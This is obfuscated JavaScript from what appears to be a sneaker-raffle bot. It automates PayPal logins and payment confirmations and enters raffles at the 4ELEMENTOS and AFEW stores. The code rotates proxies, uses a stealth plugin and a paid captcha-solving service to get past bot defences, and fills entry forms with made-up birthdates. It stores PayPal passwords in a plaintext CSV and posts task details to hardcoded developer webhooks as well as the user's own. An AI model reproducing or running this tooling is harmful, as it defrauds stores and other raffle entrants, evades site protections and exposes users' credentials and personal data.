        console['log']('\x0a(' + _0xbff231['length'] + ')\x20' + _0xd12810['cyan']('Add\x20a\x20new\x20account'));
        let _0x229350 = await _0x15f555['get']('Option');
        if (_0x229350['Option'] < _0xbff231['length'])
            return _0xbff231[_0x229350['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x9e4f46 = {}, _0x2a89b0 = await _0x15f555['get']('Email');
        _0x9e4f46['Email'] = _0x2a89b0['Email'];
        var _0x2af1a9 = Math['round'](Math['random']() * (_0x513c67['length'] - 0x1));
        _0x9e4f46['Proxy'] = _0x513c67[_0x2af1a9], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x198bf5 = await _0x15f555['get']('Password');
        return _0x9e4f46['Password'] = _0x198bf5['Password'], _0x3f6207['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x9e4f46['Email'] + ',' + _0x9e4f46['Password'] + ',' + _0x9e4f46['Proxy']), _0x9e4f46;
    }
    let _0x185f7a = await _0x1b2ef6();
    var _0x5538c4 = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x4663ce = await _0x15f555['get']('Amount'), _0x235fe8 = _0x4663ce['Amount'];
    async function _0x177077() {
        let _0x4b9c4b = 0x0;
        var _0x2d54d4 = new _0xc8c5aa({
            'user': _0x33c579['masterMail'],
            'password': _0x33c579['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x3f2bdb(_0x4262f6) {
            _0x2d54d4['openBox']('INBOX', ![], _0x4262f6);
        }
        _0x2d54d4['once']('ready', function () {
            _0x3f2bdb(function (_0x1b8497, _0x2e096f) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x1b8497)
                    throw _0x1b8497;
                _0x2d54d4['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x277ed7, _0x1eef89) {
                    if (!_0x1eef89 || !_0x1eef89['length'])
                        console['log'](_0x303e65() + '\x20[' + _0x55e1c4 + ']\x20No\x20mails\x20found'), _0x2d54d4['end']();
                    else {
                        _0x1eef89 = _0x1eef89['slice'](0x0, _0x235fe8);
                        var _0x383fce = _0x2d54d4['seq']['fetch'](_0x1eef89, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x383fce['on']('message', function (_0x1e437e, _0x4f4f58) {
                            var _0x3c65a8 = '(#' + _0x4f4f58 + ')\x20';
                            _0x1e437e['on']('body', function (_0x583eed, _0x53f1b0) {
                                _0x1d4048(_0x583eed, (_0x545ee9, _0x74cd00) => {
                                    if (_0x74cd00['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x74cd00['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x74cd00['text']['split']('[')[0x2];
                                        var _0x298193 = mes['split'](']')[0x0];
                                        _0x5538c4['push'](_0x298193);
                                    }
                                });
                            }), _0x1e437e['once']('end', function () {
                                _0x4b9c4b++;
                            });
                        }), _0x383fce['once']('error', function (_0x4714c7) {
                            console['log']('Fetch\x20error:\x20' + _0x4714c7);
                        }), _0x383fce['once']('end', function () {
                            _0x2d54d4['end']();
                        });
                    }
                });
            });
        }), _0x2d54d4['once']('error', function (_0xe58bdb) {
            console['log'](_0xd12810['red'](_0xe58bdb['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x2d54d4['once']('end', async function () {
        }), _0x2d54d4['connect']();
    }
    try {
        _0x177077(), await _0x4b01dc(0xfa0), console['log']('Found\x20' + _0x5538c4['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x4b01dc(0xfa0);
    }
    var _0x3f0e71;
    _0x369d34('' + _0x55e1c4);
    var _0x2f7019 = _0x185f7a['Proxy']['split'](':'), _0x37dbf9;
    try {
        _0x37dbf9 = await _0x284c7b['launch']({
            'userDataDir': 'sessions/' + _0x185f7a['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x2f7019[0x0] + ':' + _0x2f7019[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x37dbf9 = await _0x284c7b['launch']({
            'userDataDir': 'sessions/' + _0x185f7a['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x2f7019[0x0] + ':' + _0x2f7019[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x303e65() + '\x20[' + _0x55e1c4 + ']\x20Getting\x20Session');
        const _0x27aa77 = await _0x37dbf9['newPage']();
        await _0x27aa77['authenticate']({
            'username': '' + _0x2f7019[0x2],
            'password': '' + _0x2f7019[0x3]
        }), await _0x27aa77['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x27aa77['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x303e65() + '\x20[' + _0x55e1c4 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x27aa77['waitForSelector']('#email');
            let _0x51c144 = await _0x27aa77['$eval']('#email', _0x8333b => _0x8333b['getAttribute']('value'));
            if (_0x51c144 == '') {
                await _0x27aa77['type']('#email', _0x185f7a['Email']), await _0x4b01dc(0x1d3);
                let _0x5d537e = await _0x27aa77['$']('#splitPassword');
                _0x5d537e && (await _0x27aa77['click']('#btnNext'), await _0x4b01dc(0xa28)), await _0x27aa77['type']('#password', _0x185f7a['Password']), await _0x4b01dc(0x35c), await _0x27aa77['click']('#btnLogin');
            } else
                await _0x27aa77['type']('#password', _0x185f7a['Password']), await _0x4b01dc(0x35c), await _0x27aa77['click']('#btnLogin');
            await _0x27aa77['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x303e65() + '\x20[' + _0x55e1c4 + ']\x20Successfully\x20logged\x20in'), await _0x4b01dc(0x2710);
        } catch (_0x30f51b) {
            throw new Error('Login\x20session\x20expired\x20' + _0x30f51b);
        }
        for (var _0x4764dd = 0x0; _0x4764dd < _0x5538c4['length']; _0x4764dd++) {
            console['log'](_0x303e65() + '\x20[' + _0x55e1c4 + ']\x20Task\x20' + (_0x4764dd + 0x1) + '\x20:\x20Starting\x20Verification'), _0x369d34(_0x55e1c4 + '\x20Task\x20' + (_0x4764dd + 0x1) + '\x20/\x20' + _0x5538c4['length']);
            const _0x1083d7 = await _0x37dbf9['newPage']();
            await _0x1083d7['goto']('' + _0x5538c4[_0x4764dd], { 'waitUntil': 'networkidle2' }), await _0x4b01dc(0xbb8);
            try {
                const _0x47213c = await _0x1083d7['$']('#challenge-heading');
                _0x47213c && (console['log'](_0x303e65() + '\x20[' + _0x55e1c4 + ']\x20Task\x20' + (_0x4764dd + 0x1) + '\x20:\x20' + _0xd12810['yellow']('2FA\x20Required')), await _0x1083d7['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x4b01dc(0x9c40), await _0x1083d7['waitForSelector']('#payment-submit-btn'), await _0x1083d7['$eval']('#payment-submit-btn', _0x29d58f => _0x29d58f['click']()), await _0x1083d7['click']('#payment-submit-btn');
                try {
                    await _0x1083d7['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x4b01dc(0x5dc), console['log'](_0xd12810['green'](_0x303e65() + '\x20[' + _0x55e1c4 + ']\x20Task\x20' + (_0x4764dd + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x5113d4) {
                    _0x38f5cf = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x5113d4['message']);
                } finally {
                    if (_0x38f5cf == 'yes' && _0x2b982a != 0x2) {
                        console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x55e1c4['name'] + ']\x20Task\x20' + (_0x4764dd + 0x1) + '\x20:\x20Retrying\x20(' + _0x2b982a + '\x20/\x205)')), _0x4764dd = _0x4764dd - 0x1, _0x2b982a = _0x2b982a + 0x1;
                        continue;
                    }
                    _0x38f5cf == 'yes' && _0x2b982a >= 0x2 && (_0x2b505c(csv[_0x4764dd], _0x55e1c4), _0x38f5cf = 'no', _0x2b982a = 0x0), await _0x1083d7['close'](), await _0x4b01dc(0x4650);
                }
            } catch (_0x880af4) {
                console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x55e1c4 + ']\x20Task\x20' + (_0x4764dd + 0x1) + '\x20:\x20' + _0x880af4));
            }
        }
    } catch (_0x4851f3) {
        console['log'](_0xd12810['red']('' + _0x4851f3));
    } finally {
        await _0x37dbf9['close']();
    }
}
const _0x5411d6 = [
    {
        'name': '4ELEMENTOS',
        'modules': [{
            'name': '4ELEMENTOS\x20Raffle\x20Entries',
            'store': '4ELEMENTOS',
            'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
            'function': async function (_0x5522c4, _0x277761, _0x2bcce8) {
                _0x284c7b['use'](_0xecf9cb()), _0x284c7b['use'](_0x88e53d({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x33c579['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x2ec1ff = 0x0; _0x2ec1ff < _0x277761['length']; _0x2ec1ff++) {
                    if (_0x42a1fb != 'yes')
                        var _0x42a1fb = '', _0x44af6a = 0x0;
                    var _0x44743c;
                    try {
                        await _0x32ecbd(_0x277761, _0x2ec1ff);
                    } catch {
                        _0x42a1fb = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    _0x369d34(_0x5522c4['name'] + '\x20Task\x20' + (_0x2ec1ff + 0x1) + '\x20/\x20' + _0x277761['length'] + '\x20||\x20File:\x20' + _0x506019 + '\x20Proxies:\x20' + _0x15bf3f);
                    var _0x7aa5a = [
                        '40',
                        '40,5',
                        '41',
                        '42',
                        '42,5',
                        '43',
                        '44',
                        '45',
                        '45,5',
                        '46',
                        '47',
                        '47,5',
                        '48'
                    ], _0x12e375 = Math['round'](Math['random']() * (_0x7aa5a['length'] - 0x1));
                    _0x277761[_0x2ec1ff]['Size'] == 'RANDOM' && (_0x277761[_0x2ec1ff]['Size'] = _0x7aa5a[_0x12e375]);
                    var _0x160413 = Math['round'](Math['random']() * (_0x2bcce8['length'] - 0x1)), _0x30abd1 = _0x2bcce8[_0x160413]['split'](':'), _0xfcf84c;
                    try {
                        _0xfcf84c = await _0x284c7b['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x30abd1[0x0] + ':' + _0x30abd1[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0xfcf84c = await _0x284c7b['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x30abd1[0x0] + ':' + _0x30abd1[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        console['log'](_0x303e65() + '\x20[' + _0x5522c4['name'] + ']\x20Task\x20' + (_0x2ec1ff + 0x1) + '\x20:\x20Getting\x20Session');
                        const _0x497348 = await _0xfcf84c['newPage']();
                        await _0x497348['authenticate']({
                            'username': '' + _0x30abd1[0x2],
                            'password': '' + _0x30abd1[0x3]
                        }), await _0x497348['setRequestInterception'](!![]), _0x497348['on']('request', _0x499f7e => {
                            _0x499f7e['resourceType']() === 'image' || _0x499f7e['resourceType']() === 'font' || _0x499f7e['resourceType']() === 'media' ? _0x499f7e['abort']() : _0x499f7e['continue']();
                        }), await _0x497348['goto'](_0x277761[_0x2ec1ff]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x303e65() + '\x20[' + _0x5522c4['name'] + ']\x20Task\x20' + (_0x2ec1ff + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x4b01dc(0x3e8), await _0x497348['waitForSelector']('#accept-all-gdpr'), await _0x497348['click']('#accept-all-gdpr'), await _0x497348['waitForSelector']('#main\x20>\x20div.product-container\x20>\x20div.col-lg-4.col-sm-12.sticky-right\x20>\x20div\x20>\x20div.cn_content.cn_content_type_inline\x20>\x20form\x20>\x20div\x20>\x20div\x20>\x20div\x20>\x20div\x20>\x20button'), await _0x4b01dc(0xbb8);
                        let _0x3d4728 = await _0x497348['$$']('button');
                        for (button of _0x3d4728) {
                            let _0x4269b3 = await _0x497348['evaluate'](_0x3e2200 => _0x3e2200['innerHTML'], button);
                            if (_0x4269b3['toLowerCase']()['includes']('ntame')) {
                                console['log']('click'), await button['click']();
                                break;
                            }
                        }
                        await _0x4b01dc(0x1388), await _0x497348['waitForSelector']('.cn_content_type_full-screen'), console['log'](_0x303e65() + '\x20[' + _0x5522c4['name'] + ']\x20Task\x20' + (_0x2ec1ff + 0x1) + '\x20:\x20Checking\x20Information'), await _0x4b01dc(0x3e8);
                        let _0x323ca2 = await _0x497348['$$']('input[name=\x22email\x22]');
                        await _0x323ca2[0x1]['click'](), await _0x4b01dc(0x12c), await _0x497348['keyboard']['type'](_0x277761[_0x2ec1ff]['Email']), await _0x4b01dc(0x1c2), await _0x497348['type']('input[name=\x22Nombre\x22]', _0x277761[_0x2ec1ff]['FirstName'] + '\x20' + _0x277761[_0x2ec1ff]['LastName']), await _0x4b01dc(0x1c2), await _0x497348['type']('input[name=\x22Direccion\x22]', _0x277761[_0x2ec1ff]['Address1'] + '\x20' + _0x277761[_0x2ec1ff]['HouseNumber'] + '\x20' + _0x277761[_0x2ec1ff]['Address2']), await _0x4b01dc(0x1c2), await _0x497348['type']('input[name=\x22Ciudad\x22]', _0x277761[_0x2ec1ff]['City']), await _0x4b01dc(0x1c2), await _0x497348['type']('input[name=\x22Provincia\x22]', _0x277761[_0x2ec1ff]['State']), await _0x4b01dc(0x1c2), await _0x497348['type']('input[name=\x22CP\x22]', _0x277761[_0x2ec1ff]['Zip']), await _0x4b01dc(0x1c2), await _0x497348['select']('select[name=\x22Pais\x22]', _0x277761[_0x2ec1ff]['Country']), await _0x4b01dc(0x1c2), await _0x497348['type']('input[name=\x22Telefono\x22]', _0x277761[_0x2ec1ff]['Phone']), await _0x4b01dc(0x1c2), await _0x497348['type']('input[name=\x22cumple\x22]', _0x54670f(0x1, 0x14) + '-' + _0x54670f(0x1, 0xb) + '-' + _0x54670f(0x7c6, 0x7d0), { 'delay': 0x96 }), await _0x4b01dc(0x1c2), await _0x497348['type']('input[name=\x22Instagram\x22]', _0x277761[_0x2ec1ff]['Follower']), await _0x4b01dc(0x1c2), await _0x497348['type']('input[name=\x22Talla\x22]', _0x277761[_0x2ec1ff]['Size']), await _0x4b01dc(0x1f4), await _0x497348['click']('#sexo_hombre'), await _0x4b01dc(0x1f4), await _0x497348['click']('#idioma_ingles'), await _0x4b01dc(0x1f4), await _0x497348['click']('#privacidad_si'), await _0x4b01dc(0x1f4), await _0x497348['click']('#acepta_suscripcion_si'), await _0x4b01dc(0x1f4), console['log'](_0x303e65() + '\x20[' + _0x5522c4['name'] + ']\x20Task\x20' + (_0x2ec1ff + 0x1) + '\x20:\x20Sending\x20Request');
                        let _0x864d0f = await _0x497348['$$']('button');
                        for (button of _0x864d0f) {
                            let _0x401723 = await _0x497348['evaluate'](_0x4a1c70 => _0x4a1c70['innerHTML'], button);
                            if (_0x401723['toLowerCase']()['includes']('send')) {
                                console['log']('click'), await button['click']();
                                break;
                            }
                        }
                        await _0x4b01dc(0x1388), console['log'](_0xd12810['green'](_0x303e65() + '\x20[' + _0x5522c4['name'] + ']\x20Task\x20' + (_0x2ec1ff + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x42a1fb = '';
                        var _0x3f544c = await _0x4a5b92(_0x277761[_0x2ec1ff], _0x5522c4, 'dev', ![]), _0x4a1da9 = await _0x4a5b92(_0x277761[_0x2ec1ff], _0x5522c4, 'pub', ![]);
                        const _0x3ab54a = {
                            'succesDEVMSG': { 'embeds': [_0x3f544c] },
                            'succesPUBMSG': { 'embeds': [_0x4a1da9] }
                        };
                        try {
                            _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x3ab54a['succesDEVMSG']), await _0x4b01dc(0xc8), await _0x265172(_0x485a18, _0x3ab54a['succesDEVMSG']), await _0x4b01dc(0xc8), await _0x265172(_0x2c2f0f, _0x3ab54a['succesPUBMSG']);
                        } catch (_0x42733d) {
                            console['log'](_0xd12810['yellow'](_0x303e65() + '\x20[' + _0x5522c4['name'] + ']\x20Task\x20' + (_0x2ec1ff + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x42733d));
                        }
                    } catch (_0x5a0915) {
                        console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x5522c4['name'] + ']\x20Task\x20' + (_0x2ec1ff + 0x1) + '\x20:\x20' + _0x5a0915)), _0x44743c = '' + _0x5a0915;
                        var _0x1fe458 = await _0x4a5b92(_0x277761[_0x2ec1ff], _0x5522c4, 'dev', !![], _0x44743c), _0x3f544c = await _0x4a5b92(_0x277761[_0x2ec1ff], _0x5522c4, 'dev', ![]), _0x4a1da9 = await _0x4a5b92(_0x277761[_0x2ec1ff], _0x5522c4, 'pub', ![]);
                        const _0x64c499 = {
                            'succesDEVMSG': { 'embeds': [_0x3f544c] },
                            'succesPUBMSG': { 'embeds': [_0x4a1da9] }
                        };
                        _0x64c499['errorDEV'] = { 'embeds': [_0x1fe458] }, _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x64c499['errorDEV']), await _0x265172(_0x3cc994, _0x64c499['errorDEV']), _0x5a0915 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x42a1fb = 'yes');
                    } finally {
                        _0xfcf84c['close']();
                        if (_0x42a1fb == 'yes' && _0x44af6a != 0x5 && _0x44743c != 'Size\x20Not\x20Found') {
                            console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x5522c4['name'] + ']\x20Task\x20' + (_0x2ec1ff + 0x1) + '\x20:\x20Retrying\x20(' + _0x44af6a + '\x20/\x205)\x20')), _0x2ec1ff = _0x2ec1ff - 0x1, _0x44af6a = _0x44af6a + 0x1;
                            continue;
                        }
                        _0x42a1fb == 'yes' && _0x44af6a >= 0x5 && (_0x2b505c(_0x277761[_0x2ec1ff], _0x5522c4), _0x42a1fb = 'no', _0x44af6a = 0x0), console['log'](_0x303e65() + '\x20[' + _0x5522c4['name'] + ']\x20Waiting\x20for\x20' + _0x33c579['delay'] + '\x20ms'), await _0x4b01dc(_0x33c579['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x26ec85, _0x2070bd, _0x30e1ff) {
                for (var _0x198610 = 0x0; _0x198610 < _0x2070bd['length']; _0x198610++) {
                    _0x33c579['AfewDelay'] = _0x33c579['delay'];
                    var _0x50eb47;
                    if (_0xc8b264 != 'yes')
                        var _0xc8b264 = '', _0x299ea9 = 0x0;
                    var _0x4ddd18 = _0x2070bd[_0x198610]['Url'], _0x56adf5 = _0x2070bd[_0x198610];
                    _0x369d34(_0x26ec85['name'] + '\x20Task\x20' + (_0x198610 + 0x1) + '\x20/\x20' + _0x2070bd['length'] + '\x20||\x20File:\x20' + _0x506019 + '\x20Proxies:\x20' + _0x15bf3f);
                    try {
                        await _0x32ecbd(_0x2070bd, _0x198610);
                    } catch {
                        _0xc8b264 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x26e5b6(_0x708c4e) {
                        const _0x53050a = _0x3f6207['readFileSync']('../successful-tasks.csv', 'utf8'), _0x187bd6 = _0x3a0f5b['parse'](_0x53050a, { 'header': !![] })['data'];
                        let _0x1e6731 = ![];
                        for (var _0x2208b3 of _0x187bd6) {
                            if (_0x2208b3['Url'] == _0x708c4e['Url'] && _0x2208b3['Email'] == _0x708c4e['Email']) {
                                _0x1e6731 = !![];
                                break;
                            }
                        }
                        return _0x1e6731;
                    }
                    if (await _0x26e5b6(_0x2070bd[_0x198610]) == !![]) {
                        console['log'](_0x303e65() + '\x20[' + _0x26ec85['name'] + ']\x20Task\x20' + (_0x198610 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x22d2e4 = await _0x4a5b92(_0x2070bd[_0x198610], _0x26ec85, 'dev', ![]), _0x18cb3d = await _0x4a5b92(_0x2070bd[_0x198610], _0x26ec85, 'pub', ![]);
                    const _0x40a67d = {
                        'succesDEVMSG': { 'embeds': [_0x22d2e4] },
                        'succesPUBMSG': { 'embeds': [_0x18cb3d] }
                    };
                    if (_0x2070bd[_0x198610]['Email'] == '' || _0x2070bd[_0x198610]['FirstName'] == '' || _0x2070bd[_0x198610]['LastName'] == '' || _0x2070bd[_0x198610]['Country'] == '' || _0x2070bd[_0x198610]['Size'] == '' || _0x2070bd[_0x198610]['Address1'] == '' || _0x2070bd[_0x198610]['Zip'] == '') {
                        console['log'](_0x303e65() + '\x20[' + _0x26ec85['name'] + ']\x20Task\x20' + (_0x198610 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    _0x2070bd[_0x198610]['Country']['length'] == 0x2 && (_0x2070bd[_0x198610]['Country'] = _0x584ee8[_0x2070bd[_0x198610]['Country']]);
                    if (_0x33c579['useRandomProxy'] = ![])
                        var _0xece115 = _0x30e1ff[_0x198610]['split'](':');
                    else
                        var _0x5db357 = Math['round'](Math['random']() * (_0x30e1ff['length'] - 0x1)), _0xece115 = _0x30e1ff[_0x5db357]['split'](':');
                    var _0x5a0608;
                    try {
                        _0x5a0608 = await _0x284c7b['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0xece115[0x0] + ':' + _0xece115[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x5a0608 = await _0x284c7b['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0xece115[0x0] + ':' + _0xece115[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x24c3a2 = JSON['parse'](_0x3f6207['readFileSync']('sizes.json', 'utf-8')), _0x4ddd18 = _0x2070bd[_0x198610]['Url'], _0x3ddfff = _0x2070bd[_0x198610]['Size'], _0x3c75f9;
                        async function _0x479f05() {
                            var _0x39076b = new _0x3c1b34['CookieJar']();
                            console['log'](_0x303e65() + '\x20[' + _0x26ec85['name'] + ']\x20Task\x20' + (_0x198610 + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x44bb25;
                            let _0x4ced5c = {
                                'method': 'GET',
                                'cookieJar': _0x39076b,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0xece115[0x2] + ':' + _0xece115[0x3] + '@' + _0xece115[0x0] + ':' + _0xece115[0x1]
                            }, _0x22ad2b = _0x4ddd18['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x33f13c = _0x22ad2b + '.json', _0x378925 = await _0x4f7750(_0x33f13c);
                            console['log'](_0x303e65() + '\x20[' + _0x26ec85['name'] + ']\x20Task\x20' + (_0x198610 + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0xb0228b = _0x378925['data']['product']['variants'];
                            if (_0x3ddfff != 'RANDOM') {
                                if (_0xb0228b[0x1]['option1']['includes']('W')) {
                                    const _0x1e106b = _0x24c3a2['women']['find'](_0x364704 => _0x364704['EUsize'] === _0x3ddfff);
                                    _0x1e106b && (_0x3ddfff = _0x1e106b['size']);
                                } else {
                                    if (_0xb0228b[0x1]['option1']['includes']('Y')) {
                                        const _0x2729f3 = _0x24c3a2['men']['find'](_0x586fcf => _0x586fcf['EUsize'] === _0x3ddfff);
                                        _0x2729f3 && (_0x3ddfff = _0x2729f3['size'] + 'Y');
                                    } else {
                                        const _0x226a2f = _0x24c3a2['men']['find'](_0x136d7b => _0x136d7b['EUsize'] === _0x3ddfff);
                                        _0x226a2f && (_0x3ddfff = _0x226a2f['size']);
                                    }
                                }
                                for (var _0x26f7a5 of _0xb0228b) {
                                    _0x26f7a5['option1'] == _0x3ddfff && (_0x44bb25 = _0x26f7a5['id']);
                                }
                            } else {
                                var _0x183acc = Math['round'](Math['random']() * (_0xb0228b['length'] - 0x1));
                                _0x44bb25 = _0xb0228b[_0x183acc]['id'];
                            }
                            console['log'](_0x303e65() + '\x20[' + _0x26ec85['name'] + ']\x20Task\x20' + (_0x198610 + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x4f7750('https://raffles.afew-store.com/cart/' + _0x44bb25 + ':1'), _0x3c75f9 = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x479f05();
                        } catch (_0x45bcc6) {
                            if (_0x45bcc6['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x45bcc6);
                        }
                        const _0x46855c = await _0x5a0608['newPage']();
                        await _0x46855c['setDefaultNavigationTimeout'](0x1d4c0), await _0x46855c['authenticate']({
                            'username': '' + _0xece115[0x2],
                            'password': '' + _0xece115[0x3]
                        }), await _0x46855c['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x46855c['setRequestInterception'](!![]), _0x46855c['on']('request', _0x520aca => {
                            _0x520aca['resourceType']() === 'image' || _0x520aca['resourceType']() === 'font' || _0x520aca['resourceType']() === 'media' ? _0x520aca['abort']() : _0x520aca['continue']();
                        });
                        try {
                            await _0x46855c['goto'](_0x3c75f9, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x303e65() + '\x20[' + _0x26ec85['name'] + ']\x20Task\x20' + (_0x198610 + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x46855c['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x46855c['type']('#checkout_email', '' + _0x2070bd[_0x198610]['Email']), await _0x4b01dc(0x320), await _0x46855c['type']('#checkout_attributes_instagram', '' + _0x2070bd[_0x198610]['Follower']), await _0x4b01dc(0x320), await _0x46855c['select']('#checkout_shipping_address_country', '' + _0x2070bd[_0x198610]['Country']), await _0x46855c['waitForTimeout'](0x258), await _0x46855c['type']('#checkout_shipping_address_first_name', '' + _0x2070bd[_0x198610]['FirstName']), await _0x46855c['waitForTimeout'](0x320), await _0x46855c['type']('#checkout_shipping_address_last_name', '' + _0x2070bd[_0x198610]['LastName']), await _0x46855c['waitForTimeout'](0x2bc), await _0x46855c['type']('#checkout_shipping_address_address1', _0x2070bd[_0x198610]['Address1'] + '\x20' + _0x2070bd[_0x198610]['HouseNumber']), await _0x46855c['waitForTimeout'](0x2bc), await _0x46855c['type']('#checkout_shipping_address_address2', '' + _0x2070bd[_0x198610]['Address2']), await _0x46855c['waitForTimeout'](0x2bc), await _0x46855c['type']('#checkout_shipping_address_zip', '' + _0x2070bd[_0x198610]['Zip']), await _0x46855c['waitForTimeout'](0x2bc), await _0x46855c['type']('#checkout_shipping_address_city', '' + _0x2070bd[_0x198610]['City']), await _0x46855c['waitForTimeout'](0x2bc);
                        if (_0x2070bd[_0x198610]['State'] != '')
                            try {
